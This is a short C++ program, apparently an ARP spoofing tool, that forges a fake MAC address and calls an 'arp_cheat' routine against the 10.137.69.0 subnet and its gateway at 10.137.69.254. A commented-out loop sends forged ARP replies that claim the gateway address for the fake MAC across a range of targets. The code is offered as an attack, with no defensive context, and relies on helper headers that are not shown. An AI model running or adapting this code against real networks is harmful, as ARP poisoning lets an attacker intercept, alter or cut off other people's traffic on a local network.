#include <tcp_client.h>
#include <tcp_server.h>
#include <sock_funs.h>
#include <sock_base.h>
#include <mac_arp.h>


int main() {
    mac_arp mya;
    my_mac m;
    my_arp a;
    //mya.recv_arp(&m, &a);
    char *fake_mac="\xac\x45\x89\x90\x45\x7a";

/*
    while(1) {
        while(st != 0xffffffff) {
            mya.form_arp(&a,"10.137.0.1" , inet_ntoa(*(struct in_addr*)&st), 2, fake_mac);
            mya.send_arp(&m, &a);
            printf("ip:%s\n",inet_ntoa(*(struct in_addr*)&st));
            st=htonl(st);
            st++;
            st=htonl(st);
        }
        st = inet_addr(tar);
        //sleep(1);
    }
    */

    uint32_t tepp=mya.local_ipend();
    //printf("%s\n",inet_ntoa(i2addr_in(tepp)));
    mya.arp_cheat("10.137.69.0", "10.137.69.254");



    return 0;
}
